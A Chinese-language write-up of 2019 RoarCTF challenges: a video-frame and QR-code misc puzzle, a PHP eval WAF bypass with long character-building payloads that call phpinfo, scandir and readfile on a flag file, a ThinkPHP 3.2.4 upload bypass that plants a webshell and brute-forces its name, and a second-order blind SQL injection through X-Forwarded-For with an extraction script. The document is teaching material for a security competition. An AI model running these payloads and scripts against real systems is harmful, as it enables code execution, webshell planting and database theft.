# 2019RoarCTF

## 黄金6年

魔性的bgm.....

使用工具ffmpeg对视频进行分帧。

```php
ffmpeg -i 黄金6年.mp4 -r 60 -f j-%05d.bmp
```

分别在C++，白帽子讲web安全，逆向工程，还有活着

![](/home/cookie/Pictures/blogs/2019roarCTF/4.png)

![](/home/cookie/Pictures/blogs/2019roarCTF/5.png)



![](/home/cookie/Pictures/blogs/2019roarCTF/6.png)

![](/home/cookie/Pictures/blogs/2019roarCTF/7.png)

扫描二维码获得密码：iwantplayctf

对mp4文件中的文件进行分解

![](/home/cookie/Pictures/blogs/2019roarCTF/8.png)

```php
echo "UmFyIRoHAQAzkrXlCgEFBgAFAQGAgADh7ek5VQIDPLAABKEAIEvsUpGAAwAIZmxhZy50eHQwAQAD"| base64 -d > test.rar
```

![](/home/cookie/Pictures/blogs/2019roarCTF/9.png)

用密码解压，获得flag文件

![](/home/cookie/Pictures/blogs/2019roarCTF/10.png)



## easy_calc

### 预期

预期解只要把`?num=`改成`?%20num=`或者`?+num=`绕过waf.

参考：[https://xz.aliyun.com/t/5621](https://xz.aliyun.com/t/5621)

payload如下：

```php
?%20num=phpinfo()
?+num=phpinfo()
```



### 非预期

calc.php提供源码：

```php
<?php 
error_reporting(0); 
if(!isset($_GET['num'])){ 
    show_source(__FILE__); 
}else{ 
        $str = $_GET['num']; 
        $blacklist = [' ', '\t', '\r', '\n','\'', '"', '`', '\[', '\]','\$','\\','\^']; 
        foreach ($blacklist as $blackitem) { 
                if (preg_match('/' . $blackitem . '/m', $str)) { 
                        die("what are you want to do?"); 
                } 
        } 
        eval('echo '.$str.';'); 
} 
?> 
```

由于全局waf的原因，构造payload时，能使用的字符有

```php
数字[0-9] + - * / E | () % {} . &  
```

输入过长的数字将会得到，并且我们还可以将使用'.'进行字符串的拼接。

![](/home/cookie/Pictures/blogs/2019roarCTF/1.png)



测出可以使用[0-9]|@可以得到字符[p-y]......

![](/home/cookie/Pictures/blogs/2019roarCTF/2.png)

同时经过测试,@如下：

```php
(((100000000000000000000).(1)){3})%26(~((((1).(7)){1})|(((1).(0)){1})|(((1.1).(1)){1})))
```

根据ASCII对应表：[传送门](<http://ascii.911cha.com/>)，我们通过**0x21-0x39|@构造出a-z的字符**，然后再通过'.'拼接.

我们最终都是要把我们所需的字符使用数字**[0-9]  + . E 使用  或(|)，与(&) 操作**来获得

字符通过如下脚本获取：

```php
#-*- coding: utf-8 -*-
#可用字符
a=['0','1','2','3','4','5','6','7','8','9','E','+','.']
b=[]
c=[]
d=[]

b1=[]
for i in a:
    for j in a:
        b.append(i+'或'+j+'-------'+chr(ord(i)|ord(j)))
        b1.append(chr(ord(i)|ord(j)))
print(set(b))

c1=[]
for i in a:
    for j in a:
        c.append(i+'与'+j+'--------'+chr(ord(i)&ord(j)))
        c1.append(chr(ord(i)&ord(j)))
print(set(c))

d1=[]
for i in set(b1+c1):
	for j in set(b1+c1):
		d.append(i+'与'+j+'--------'+chr(ord(i)&ord(j)))
		d1.append(chr(ord(i)&ord(j)))
print(set(d1+b1+c1))


a=raw_input("input you find: ")

for i in (b+c+d):
    if a in i:
        print(i)
        break
```



结果如下：

```php
1.0E+202
E ((99999999999999999999).(2)){3}
+ ((99999999999999999999).(2)){4}


@ (((100000000000000000000).(1)){3})%26(~((((1).(7)){1})|(((1).(0)){1})|(((1.1).(1)){1})))

a  !|@  1&+|@  
((1).(1)){1}%26(((99999999999999999999).(2)){4})|(((100000000000000000000).(1)){3})%26(~((((1).(7)){1})|(((1).(0)){1})|(((1.1).(1)){1})))

b  "|@  2&+|@
((1).(2)){1}%26(((99999999999999999999).(2)){4})|(((100000000000000000000).(1)){3})%26(~((((1).(7)){1})|(((1).(0)){1})|(((1.1).(1)){1})))

    
c  #|@  3&+|@ 
((1).(3)){1}%26(((99999999999999999999).(2)){4})|(((100000000000000000000).(1)){3})%26(~((((1).(7)){1})|(((1).(0)){1})|(((1.1).(1)){1})))


d  $|@  4&.|@
((1).(4)){1}%26(((99999999999999999999).(2)){1})|(((100000000000000000000).(1)){3})%26(~((((1).(7)){1})|(((1).(0)){1})|(((1.1).(1)){1})))

e  %|@  /&5|@  +|.&5|@
(((((99999999999999999999).(2)){4})|(((99999999999999999999).(2)){1}))%26((1).(5)){1})|(((100000000000000000000).(1)){3})%26(~((((1).(7)){1})|(((1).(0)){1})|(((1.1).(1)){1})))


abc
(((1).(1)){1}%26(((99999999999999999999).(2)){4})|(((100000000000000000000).(1)){3})%26(~((((1).(7)){1})|(((1).(0)){1})|(((1.1).(1)){1})))).(((1).(2)){1}%26(((99999999999999999999).(2)){4})|(((100000000000000000000).(1)){3})%26(~((((1).(7)){1})|(((1).(0)){1})|(((1.1).(1)){1})))).(((1).(3)){1}%26(((99999999999999999999).(2)){4})|(((100000000000000000000).(1)){3})%26(~((((1).(7)){1})|(((1).(0)){1})|(((1.1).(1)){1}))))
```

![](/home/cookie/Pictures/blogs/2019roarCTF/3.png)



由此构造payload:

```markdown
//phpinfo()
?num=(((((1).(0)){1})|(((100000000000000000000).(1)){3})%26(~((((1).(7)){1})|(((1).(0)){1})|(((1.1).(1)){1})))).((((1).(8)){1})%26(((9999999999999999999999).(1)){1})|(((100000000000000000000).(1)){3})%26(~((((1).(7)){1})|(((1).(0)){1})|(((1.1).(1)){1})))).((((1).(0)){1})|(((100000000000000000000).(1)){3})%26(~((((1).(7)){1})|(((1).(0)){1})|(((1.1).(1)){1})))).((((1).(9)){1})%26(((9999999999999999999999).(1)){4})|(((100000000000000000000).(1)){3})%26(~((((1).(7)){1})|(((1).(0)){1})|(((1.1).(1)){1})))).((((9999999999999999999999).(1)){1})|(((100000000000000000000).(1)){3})%26(~((((1).(7)){1})|(((1).(0)){1})|(((1.1).(1)){1})))).((((1).(7)){1})%26(((9999999999999999999999).(1)){1})|(((100000000000000000000).(1)){3})%26(~((((1).(7)){1})|(((1).(0)){1})|(((1.1).(1)){1})))).((((9999999999999999999999).(1)){3})|(((9999999999999999999999).(1)){4})))()

//scandir('/')
?num=((((9999999999999999999999).(1)){1})|(((9999999999999999999999).(1)){4})).((((1).(7)){1})%26(((9999999999999999999999).(1)){1})|(((100000000000000000000).(1)){3})%26(~((((1).(7)){1})|(((1).(0)){1})|(((1.1).(1)){1})))).((((1).(1)){1})).((((1).(1)){1})%26(((9999999999999999999999).(1)){4})|(((100000000000000000000).(1)){3})%26(~((((1).(7)){1})|(((1).(0)){1})|(((1.1).(1)){1})))).(((((9999999999999999999999).(1)){1})|(((9999999999999999999999).(1)){4}))%26(((1).(7)){1})|(((100000000000000000000).(1)){3})%26(~((((1).(7)){1})|(((1).(0)){1})|(((1.1).(1)){1})))).(((((9999999999999999999999).(1)){1})|(((9999999999999999999999).(1)){4}))%26(((1).(7)){1})|(((100000000000000000000).(1)){3})%26(~((((1).(7)){1})|(((1).(0)){1})|(((1.1).(1)){1}))))

//readfile('/f1agg')
?num=(((((1).(2)){1})|(((100000000000000000000).(1)){3})%26(~((((1).(7)){1})|(((1).(0)){1})|(((1.1).(1)){1})))).(((((9999999999999999999999).(1)){1})|(((9999999999999999999999).(1)){4}))%26(((1).(5)){1})|(((100000000000000000000).(1)){3})%26(~((((1).(7)){1})|(((1).(0)){1})|(((1.1).(1)){1})))).((((1).(1)){1})%26(((9999999999999999999999).(1)){4})|(((100000000000000000000).(1)){3})%26(~((((1).(7)){1})|(((1).(0)){1})|(((1.1).(1)){1})))).((((1).(4)){1})%26(((9999999999999999999999).(1)){1})|(((100000000000000000000).(1)){3})%26(~((((1).(7)){1})|(((1).(0)){1})|(((1.1).(1)){1})))).((((1).(7)){1})%26(((9999999999999999999999).(1)){1})|(((100000000000000000000).(1)){3})%26(~((((1).(7)){1})|(((1).(0)){1})|(((1.1).(1)){1})))).((((1).(9)){1})%26(((9999999999999999999999).(1)){4})|(((100000000000000000000).(1)){3})%26(~((((1).(7)){1})|(((1).(0)){1})|(((1.1).(1)){1})))).(((((9999999999999999999999).(1)){4})|(((9999999999999999999999).(1)){1}))%26((((1).(4)){1})|(((1).(8)){1}))|(((100000000000000000000).(1)){3})%26(~((((1).(7)){1})|(((1).(0)){1})|(((1.1).(1)){1})))).(((((9999999999999999999999).(1)){1})|(((9999999999999999999999).(1)){4}))%26(((1).(5)){1})|(((100000000000000000000).(1)){3})%26(~((((1).(7)){1})|(((1).(0)){1})|(((1.1).(1)){1})))))(((((9999999999999999999999).(1)){1})|(((9999999999999999999999).(1)){4})).((((1).(7)){1})%26(((9999999999999999999999).(1)){1})|(((100000000000000000000).(1)){3})%26(~((((1).(7)){1})|(((1).(0)){1})|(((1.1).(1)){1})))).((((1).(1)){1})).((((1).(1)){1})%26(((9999999999999999999999).(1)){4})|(((100000000000000000000).(1)){3})%26(~((((1).(7)){1})|(((1).(0)){1})|(((1.1).(1)){1})))).(((((9999999999999999999999).(1)){1})|(((9999999999999999999999).(1)){4}))%26(((1).(7)){1})|(((100000000000000000000).(1)){3})%26(~((((1).(7)){1})|(((1).(0)){1})|(((1.1).(1)){1})))).(((((9999999999999999999999).(1)){1})|(((9999999999999999999999).(1)){4}))%26(((1).(7)){1})|(((100000000000000000000).(1)){3})%26(~((((1).(7)){1})|(((1).(0)){1})|(((1.1).(1)){1})))))
```



## simple_upload

题目提供源码，从代码可以看出这道题他使用了tp的框架，根据报错信息，可以看出这里使用了tp3.2.4的框架。

```php
<?php 
namespace Home\Controller; 

use Think\Controller; 

class IndexController extends Controller 
{ 
    public function index() 
    { 
        show_source(__FILE__); 
    } 
    public function upload() 
    { 
        $uploadFile = $_FILES['file'] ; 
         
        if (strstr(strtolower($uploadFile['name']), ".php") ) { 
            return false; 
        } 
         
        $upload = new \Think\Upload();// 实例化上传类 
        $upload->maxSize  = 4096 ;// 设置附件上传大小 
        $upload->allowExts  = array('jpg', 'gif', 'png', 'jpeg');// 设置附件上传类型 
        $upload->rootPath = './Public/Uploads/';// 设置附件上传目录 
        $upload->savePath = '';// 设置附件上传子目录 
        $info = $upload->upload() ; 
        if(!$info) {// 上传错误提示错误信息 
          $this->error($upload->getError()); 
          return; 
        }else{// 上传成功 获取上传文件信息 
          $url = __ROOT__.substr($upload->rootPath,1).$info['file']['savepath'].$info['file']['savename'] ; 
          echo json_encode(array("url"=>$url,"success"=>1)); 
        } 
    } 
}
```

网上下载tp3.2.4的源码，这里重新了upload方法。

当我们上传正常的jpg文件，正常回显文件名和文件路径如下：

![](/home/cookie/Pictures/blogs/2019roarCTF/14.png)



上传文件数组时，webshell上传成功，但是文件路径没有回显如下：

![](/home/cookie/Pictures/blogs/2019roarCTF/15.png)



代码中调用了tp中upload.class.php中的upload方法，分析一下为什么webshell上传成功却没有回显

tp中有调用了一个函数dealFiles()

```php
// 对上传文件数组信息处理
$files = $this->dealFiles($files);
```

我们本地测试一下这个函数

![](/home/cookie/Pictures/blogs/2019roarCTF/16.png)

返回结果如下：

![](/home/cookie/Pictures/blogs/2019roarCTF/17.png)

经过dealFiles的处理,$key=0，tp中

```php
$info[$key] = $file;
return empty($info) ? false : $info;
```

这是tp返回内容，也就是将会放回$info[0]，但是

```php
else{// 上传成功 获取上传文件信息 
          $url = __ROOT__.substr($upload->rootPath,1).$info['file']['savepath'].$info['file']['savename'] ; 
          echo json_encode(array("url"=>$url,"success"=>1)); 
        } 
```

上传成功，回显的需要是$info['file']，但是经过处理返回的是$info[0]。所以就没有返回路径。

分析文件名是如何生成的，

```php

            /* 生成保存文件名 */
            $savename = $this->getSaveName($file);
            if (false == $savename) {
                continue;
            } else {
                $file['savename'] = $savename;
            }
```

跟进getSaveName()

```php
    //上传文件命名规则，[0]-函数名，[1]-参数，多个参数使用数组
    'saveName'     => array('uniqid', ''),
... ...
    ... ...
    private function getSaveName($file)
    {
        $rule = $this->saveName;
        if (empty($rule)) {
            //保持文件名不变
            /* 解决pathinfo中文文件名BUG */
            $filename = substr(pathinfo("_{$file['name']}", PATHINFO_FILENAME), 1);
            $savename = $filename;
        } else {
            $savename = $this->getName($rule, $file['name']);
            if (empty($savename)) {
                $this->error = '文件命名规则错误！';
                return false;
            }
        }

        /* 文件保存后缀，支持强制更改文件后缀 */
        $ext = empty($this->config['saveExt']) ? $file['ext'] : $this->saveExt;

        return $savename . '.' . $ext;
    }
```

到getName()

```php
    private function getName($rule, $filename)
    {
        $name = '';
        if (is_array($rule)) {
            //数组规则
            $func  = $rule[0];//uniqid
            $param = (array) $rule[1];//null
            foreach ($param as &$value) {
                $value = str_replace('__FILE__', $filename, $value);
            }
            $name = call_user_func_array($func, $param);
        } elseif (is_string($rule)) {
            //字符串规则
            if (function_exists($rule)) {
                $name = call_user_func($rule);
            } else {
                $name = $rule;
            }
        }
        return $name;
    }

```

实际上文件名其实就是`/时间日期/uniquid().ext`

![](/home/cookie/Pictures/blogs/2019roarCTF/18.png)



所以我们我们通过数组绕过上传的文件是成功上传的，就是不知道文件名就是了。所以我们得爆破才行

exp1:

```python
import requests
url = "http://8c985534-ecee-47b6-8dc9-0b7565ec2bb4.node3.buuoj.cn/?m=home&c=index&a=upload"
files = {
    "file":open("/home/cookie/Documents/muma/info.jpg","r")
}

r = requests.post(url,files=files)
print(r.text)

files = {
    "file[]":open("/home/cookie/Documents/muma/shell.php","r")
}

r = requests.post(url,files=files)
print(r.text)

files = {
    "file":open("/home/cookie/Documents/muma/info2.jpg","r")
}

r = requests.post(url,files=files)
print(r.text)
```

上传文件，根据回显可以知道我们上传的文件名在5da7e42793e0d-5da7e427ceb49之间。

```python
{"url":"\/Public\/Uploads\/2019-10-17\/5da7e42793e0d.jpg","success":1}
{"url":"\/Public\/Uploads\/","success":1}
{"url":"\/Public\/Uploads\/2019-10-17\/5da7e427ceb49.jpg","success":1}
```

爆破脚本

exp2:

```python
import requests

s = "0123456789abcdef"
for i in range(6,10):
    for j in range(0,16):
        for k in range(5,16):
            for l in range(0,16):
                for m in range(0,16):
                    filename = "5da7f131" + hex(i)[2:] + hex(j)[2:] + hex(k)[2:] + hex(l)[2:] + hex(m)[2:]
                    url = "http://8c985534-ecee-47b6-8dc9-0b7565ec2bb4.node3.buuoj.cn/Public/Uploads/2019-10-17/%s.php"%filename
                    r = requests.get(url)
                    print(str(r.status_code) + ":" + filename)
                    if r.status_code == 200:
                        print("------------------------------------------right_filename:"+filename)
```

爆破得到文件名，访问即可。



## online-proxy

考察sql盲注，注入过程如下

![](/home/cookie/Pictures/blogs/2019roarCTF/11.png)

这是X-Forwarded-For是我们的payload



![](/home/cookie/Pictures/blogs/2019roarCTF/13.png)

第二次写入X-Forwarded-For，我们的payload被写入Last Ip



![](/home/cookie/Pictures/blogs/2019roarCTF/12.png)

第三次访问的时候，我们的payload被执行



基于这个思路编写爆破脚本，exp如下：

```python
import requests

flag=""

url = "http://node3.buuoj.cn:28083/"
for space in range(1,100):
    for i in range(48,123):
        s = requests.session()
        payload = "1' and ascii(substr(database(),%d,1))=%d and '1' = '1"%(space,i)
        print(payload)
        headers1 = {"X-Forwarded-For":payload}
        r1 = s.get(url,headers = headers1)
        headers2 = {"X-Forwarded-For":"1' and '1' = '2"}
        r2 = s.get(url,headers = headers2)
        r2=  s.get(url,headers = headers2) 
        if "Last Ip: 1" in r2.text:
            flag = flag+chr(i)
            print("flag is [ "+flag+" ]")
            break
```

